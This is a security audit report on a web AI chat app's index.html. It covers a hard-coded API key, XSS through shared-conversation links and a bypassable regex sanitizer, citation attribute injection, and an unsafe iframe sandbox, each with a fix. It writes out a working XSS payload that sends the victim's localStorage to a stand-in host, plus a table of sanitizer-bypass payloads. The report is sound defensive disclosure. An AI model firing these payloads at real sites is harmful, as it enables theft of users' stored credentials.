# Bug Report: Manthan Agent (SahuAI-PRO-Lite) `Beta/index.html`

**File reviewed:** `index1.txt` (uploaded copy of `Beta/index.html`)
**Version string in file:** Manthan Agent v7.8 (script header still says v5.0; repo description says v7.2)
**Size:** 14,838 lines, 3 inline `<script>` blocks (lines 5492, 5610, 14567)

## Method

- Syntax-checked all three script blocks with `node --check`: **all parse cleanly**.
- Cross-referenced every `getElementById` literal and inline handler against the markup.
- Scanned for hard-coded credentials, `eval`, `document.write`, and `innerHTML` sinks.
- Extracted the real `formatMarkdown` and `_sahuRichBlocks` functions and ran them against XSS payloads in a Node harness. Every security finding marked **verified** was reproduced this way, not just reasoned about.

## Summary

| # | Severity | Issue | Lines |
|---|----------|-------|-------|
| 1 | Critical | Hard-coded NVIDIA API key in source | 8520, 9947 |
| 2 | Critical | One-click XSS via shared-conversation URL hash | ~14082 |
| 3 | Critical | `formatMarkdown` regex sanitizer is bypassable | 9759-9770 |
| 4 | Critical | Attribute injection through citation links | 9781, 9786 |
| 5 | High | Saving settings silently disables all safety models | 7439-7441 |
| 6 | High | ~30 dead settings controls read in `saveSettings` | 7401-7451 |
| 7 | High | Iframe sandbox includes `allow-same-origin` + `allow-scripts` | 5485, 9855 |
| 8 | Medium | `eval()` in CALC tool can freeze the tab | 9414 |
| 9 | Medium | Missing PWA / APK assets | 10-12, 4633 |
| 10 | Medium | `openPreview` uses `document.write` into a same-origin window | 9736 |
| 11 | Low | Minor issues (theme label, NaN settings, scaffolding, empty catches) | various |

---

## Critical

### 1. Hard-coded API key in source (lines 8520, 9947)

An NVIDIA key beginning `nvapi-SrudFpx...` is embedded in the file and used as the fallback for every visitor:

```js
// line 8520
const apiKey = localStorage.getItem('sahu_nvidia_key') || 'nvapi-...';
// line 9947
apiKey = 'nvapi-...';
```

Anyone who opens View Source, and anyone who can see the public repo, can copy it.

**Fix**
1. **Revoke and rotate the key now.** Treat it as compromised. Deleting it from the file is not enough because it remains in git history.
2. Remove both fallbacks.
3. Route these calls through a small proxy (serverless function or backend) that holds the key server-side.

### 2. One-click XSS via shared-conversation links (`handleSharedConversation`, ~line 14082)

The app decodes a conversation from the URL hash and renders it. Assistant messages go through `formatMarkdown` and into `innerHTML`.

**Verified payload:**
```html
<img src=x/onerror=fetch("//evil.example/?k="+btoa(JSON.stringify(localStorage)))>
```
Output from the real `formatMarkdown`: **unchanged, handler intact.**

Because API keys live in `localStorage` on the same origin, one crafted link can steal every key a victim has saved.

**Fix:** sanitize with DOMPurify before any `innerHTML` assignment (see #3). Also consider not rendering shared content as HTML at all.

### 3. `formatMarkdown` sanitizer is a bypassable regex blacklist (lines 9759-9770)

**Verified bypasses (all pass through unchanged):**

| Payload | Why it works |
|---|---|
| `<img src=x/onerror=...>` | The `on*` filter requires whitespace before the attribute; `/` is not whitespace |
| `<svg/onload=...>` | Same |
| `<a href=javascript:...>` (unquoted) | The `javascript:` filter only handles quoted values |
| `<scr<script></script>ipt>...` | Script removal reassembles into a live `<script>` tag |
| `<meta http-equiv=refresh ...>`, `<base href=...>` | Not filtered; enables redirect and link hijack |
| `<form action=https://evil...>` | Not filtered; enables phishing forms |

The same output reaches `innerHTML` at 15+ sites (e.g. lines 8198, 10600, 11327, 13530) and can include text scraped from web search results, so this is not limited to shared links.

**Fix:** stop blacklisting. Wrap the final HTML in DOMPurify:

```js
const clean = DOMPurify.sanitize(html, {
  USE_PROFILES: { html: true },
  FORBID_TAGS: ['style', 'form', 'meta', 'base', 'iframe', 'object', 'embed'],
  FORBID_ATTR: ['style']
});
```

Do this at the point where `formatMarkdown` returns, so every sink is covered.

### 4. Citation attribute injection (lines 9781, 9786)

```js
<a href="${src.link}" target="_blank" class="citation relative">
...
<div class="citation-tooltip-link">${src.link}</div>
```

`src.link` is not escaped. **Verified:** a link value of `x" onmouseover="alert(1)" data-y="` breaks out of the attribute. A hostile search result can inject handlers.

**Fix:** validate the URL (`new URL(link)`, allow only `http:`/`https:`), then escape with `escapeHtml` before interpolating. Add `rel="noopener noreferrer"` to the `target="_blank"` link.

---

## High

### 5. Saving settings silently disables all safety models (`saveSettings`, lines 7439-7441)

`state.safetyModels` defaults to `true`, but `saveSettings` reads three checkboxes that no longer exist in the markup (`safetyGraniteCheck`, `safetyShieldGemmaCheck`, `safetyLlamaGuardCheck`) and falls back to `?? false`. Every save therefore writes `false` for all three.

Compounding this, `checkSafety()` (line 9617) is an empty placeholder ("Would call IBM Granite Guardian API"), so nothing is actually enforced regardless of the toggle.

**Fix:** guard every read with `if (el)` so a missing control leaves the saved value alone, and either implement `checkSafety()` or stop presenting safety as a feature.

### 6. About 30 dead controls read in `saveSettings` (lines 7401-7451)

Comments say the Advanced Features UI was removed, but `saveSettings` still reads ~30 IDs that do not exist, including `neuralConsensusCheck`, `agentSwarmCheck`, `singleModelSelect`, `asrModelSelect`, `aggregationStyle`, `thinkingBudget`, `stageSelector`, `autoFallback`, `promptRefinerCheck`.

Consequences:
- `state.voiceConfig` is reset to defaults on every save.
- `autoFallback` and `promptRefinerEnabled` are forced to `true` by the `?? true` defaults, so users cannot turn them off.

**Fix:** delete the dead reads, or guard each with `if (el)` (same fix as #5).

### 7. Same-origin sandbox escape (lines 5485, 9855)

The canvas iframe and inline preview iframe use:

```html
sandbox="allow-scripts ... allow-same-origin"
```

Together, `allow-scripts` and `allow-same-origin` let model-generated code remove its own sandbox and read the parent's `localStorage` (API keys). The other preview iframes (lines 14694, 14744) correctly omit `allow-same-origin`, so this looks like an oversight.

**Fix:** remove `allow-same-origin` from these two iframes.

---

## Medium

### 8. `eval()` in the CALC tool (line 9414)

A character filter blocks letters but allows `*`, so `9**9**9` and `2**2**2**2**2**2` evaluate to `Infinity` or hang. A model-triggered `CALC:` call can freeze the tab.

**Fix:** replace `eval` with a small expression parser (or a vetted math library) and cap exponent size.

### 9. Missing PWA and APK assets

`manifest.json`, `icon-192.png`, `icon-512.png` and `sahu-moe.apk` are referenced (lines 10-12, 4633) but missing from the repo, as the author's own PR notes acknowledge. Effects: 404s, no install prompt, no favicon, and a dead "Install Android App" link.

**Fix:** add the files, or remove the references.

### 10. `openPreview` writes model output into a same-origin window (line 9736)

`document.write` into `window.open()` inherits every bypass from #3, and the resulting window runs with full access to the app's `localStorage`.

**Fix:** open the preview in a sandboxed iframe without `allow-same-origin` (or a `blob:` URL), and sanitize first.

---

## Low

- **Theme label inconsistency:** markup says "Light", `toggleTheme` sets "Light Mode"/"Dark Mode", and `initTheme` never sets a light label (line ~14051).
- **NaN persisted for numeric settings:** `parseFloat`/`parseInt` results (lines 7395-7396) are not validated, so an empty field stores `NaN` for temperature or max tokens.
- **Leftover scaffolding:** block 0 (lines 5492-5607) has 83 empty stub functions and a comment "JavaScript implementation expected in index.js". Only `loadSettings` is never overridden and remains a no-op. The script header says v5.0 while the title says v7.8.
- **64 empty `catch {}` blocks** hide real failures and make the issues above harder to diagnose in production.
- **API keys stored in plaintext `localStorage`.** This is normal for a client-only app, but it is why XSS (#2-#4) is so damaging.

## Checked and found fine

- No duplicate element IDs (117 IDs, 0 duplicates).
- All three script blocks are syntactically valid.
- No duplicate function definitions within the main block (180 top-level functions).
- All 9 awaited `fetch()` calls check `.ok` or `.status`.
- API-key inputs are populated correctly from storage; the key-save loop itself is sound.
- No `setInterval` leaks (none used).

## Recommended fix order

1. **Rotate the NVIDIA key today**, then remove it from both locations (#1).
2. **Add DOMPurify** to `formatMarkdown` output. This closes #2, #3, #4 and #10 together.
3. **Guard the `saveSettings` reads** with `if (el)` and delete the dead ones (#5, #6).
4. **Drop `allow-same-origin`** from the two iframes (#7).
5. Replace `eval` in CALC (#8), add the PWA assets (#9), then clean up the low-severity items.
